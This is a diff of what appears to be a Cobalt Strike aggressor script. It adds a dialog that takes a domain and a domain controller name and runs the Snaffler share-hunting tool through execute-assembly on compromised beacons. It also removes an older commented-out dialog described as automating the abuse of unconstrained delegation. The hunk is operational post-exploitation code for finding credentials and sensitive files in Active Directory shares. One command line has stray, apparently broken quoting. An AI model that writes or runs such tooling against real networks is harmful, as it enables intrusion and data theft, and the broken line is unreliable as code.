@@ -835,22 +835,21 @@ bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -j 75 -c $1 -
 }, $bids => $1));
 }
 
-#sub finddomaincontrolleranddomainshares{
-#    $bid = $1;
-#    $dialog = dialog("DC and Domain Shares", %(interval => "", filteruser => "", execmethod => "Execute-Assembly"), lambda({
-#        $cmdargs = "";
-#        $cmdargs = "monitor /interval:$3['interval'] /filteruser:$3['filteruser']";
-#        if ($3["execmethod"] eq "Execute-Assembly"){
-#            btask($bid, 'Begin Monitoring for logons');
-#            bexecute_assembly($bid, script_resource('/exe/Snaffler.exe'), $cmdargs);
-#        }
-#    }));
-#    dialog_description($dialog, "This will help automate the process of abusing unconstrained delegation - 5 is a good interval FWIW");
-#    drow_text($dialog, "interval",  "Please Enter Domain Name:");
-#    drow_text($dialog, "filteruser",  "Please Enter DC FQDN:");
-#    dbutton_action($dialog, "Run");
-#    dialog_show($dialog);
-#}
+sub finddomaincontrolleranddomainshares{
+    $bid = $1;
+    $dialog = dialog("Show Domain and DC Shares", %(dom => "", dc => "", execmethod => "Execute-Assembly"), lambda({
+       $cmdargs = "";
+		$cmdargs = "-d $3['dom'] -c $3['dc']";
+        if ($3["execmethod"] eq "Execute-Assembly"){         
+            bexecute_assembly($bid, script_resource('/exe/Snaffler.exe'), '-s -i -j 75 '.$cmdargs.''" -v data");
+        }
+    }));
+    dialog_description($dialog, "Show Domain and DC Shares");
+    drow_text($dialog, "dom",  "Please Enter Domain");
+    drow_text($dialog, "dc",  "Please Enter DC FQDN");
+    dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
 
 #prompt_text("Insert Domain Name", "", lambda({
 #bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -j 75 -d $1 -v data");
